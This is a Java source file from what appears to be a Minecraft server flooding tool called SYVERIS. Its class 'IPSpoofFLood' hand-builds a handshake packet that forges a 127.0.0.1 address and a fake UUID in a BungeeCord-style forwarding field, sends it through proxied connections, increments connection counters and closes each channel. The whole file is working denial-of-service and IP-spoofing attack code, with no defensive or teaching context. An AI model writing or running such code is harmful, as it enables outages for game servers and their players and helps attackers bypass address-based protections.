package IO.SYVERIS.methods;

import IO.SYVERIS.Main;
import IO.SYVERIS.utils.NettyBootstrap;
import IO.SYVERIS.utils.ProxyLoader;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import java.io.IOException;

public class IPSpoofFLood implements Method {
   public static void writeVarInt(ByteBufOutputStream out, int paramInt) throws IOException {
      while((paramInt & -128) != 0) {
         out.writeByte(paramInt & 127 | 128);
         paramInt >>>= 7;
      }

      out.writeByte(paramInt);
   }

   public void accept(Channel channel, ProxyLoader.Proxy proxy) {
      ByteBuf b = Unpooled.buffer();
      ByteBufOutputStream out = new ByteBufOutputStream(b);

      try {
         out.writeByte(59);
         out.writeByte(0);
         writeVarInt(out, Main.protcolID);
         out.writeByte(52);
         out.writeByte(49);
         out.writeByte(50);
         out.writeByte(55);
         out.writeByte(46);
         out.writeByte(48);
         out.writeByte(46);
         out.writeByte(48);
         out.writeByte(46);
         out.writeByte(49);
         out.writeByte(0);
         out.writeByte(49);
         out.writeByte(50);
         out.writeByte(55);
         out.writeByte(46);
         out.writeByte(48);
         out.writeByte(46);
         out.writeByte(48);
         out.writeByte(46);
         out.writeByte(49);
         out.writeByte(0);
         out.writeByte(98);
         out.writeByte(57);
         out.writeByte(55);
         out.writeByte(51);
         out.writeByte(98);
         out.writeByte(102);
         out.writeByte(99);
         out.writeByte(49);
         out.writeByte(56);
         out.writeByte(56);
         out.writeByte(55);
         out.writeByte(99);
         out.writeByte(51);
         out.writeByte(53);
         out.writeByte(52);
         out.writeByte(51);
         out.writeByte(97);
         out.writeByte(54);
         out.writeByte(50);
         out.writeByte(57);
         out.writeByte(56);
         out.writeByte(53);
         out.writeByte(53);
         out.writeByte(57);
         out.writeByte(50);
         out.writeByte(48);
         out.writeByte(49);
         out.writeByte(100);
         out.writeByte(99);
         out.writeByte(48);
         out.writeByte(49);
         out.writeByte(50);
         out.writeByte(99);
         out.writeByte(99);
         out.writeByte(233);
         out.writeByte(2);
         out.writeByte(13);
         out.writeByte(0);
         out.writeByte(11);
         out.writeBytes("12345678901");
         out.close();
      } catch (IOException var6) {
         var6.printStackTrace();
      }

      channel.writeAndFlush(b);
      ++NettyBootstrap.totalConnections;
      ++NettyBootstrap.integer;
      channel.close();
   }
}
